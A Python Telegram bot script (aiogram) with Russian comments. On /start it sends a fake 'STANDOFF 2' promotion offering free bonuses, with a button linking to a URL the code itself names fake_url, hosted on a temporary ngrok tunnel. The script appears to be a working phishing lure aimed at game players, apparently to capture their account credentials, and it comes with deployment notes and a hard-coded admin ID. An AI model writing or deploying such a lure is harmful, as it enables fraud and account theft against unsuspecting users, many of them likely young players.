import asyncio
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command
import os

# ===== НАСТРОЙКИ (токен возьмёт из переменных окружения) =====
BOT_TOKEN = os.environ.get("BOT_TOKEN")  # на Render добавишь
ADMIN_CHAT_ID = "6739523131"  # твой ID
# ============================================================

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    fake_url = "https://shredder-spender-starved.ngrok-free.dev"  # замени если нужно
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎁 ПОЛУЧИТЬ БОНУСЫ", url=fake_url)]
    ])
    await message.answer("🔫 STANDOFF 2 — АКЦИЯ!\n\n🔥 Нажми на кнопку", reply_markup=keyboard)

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())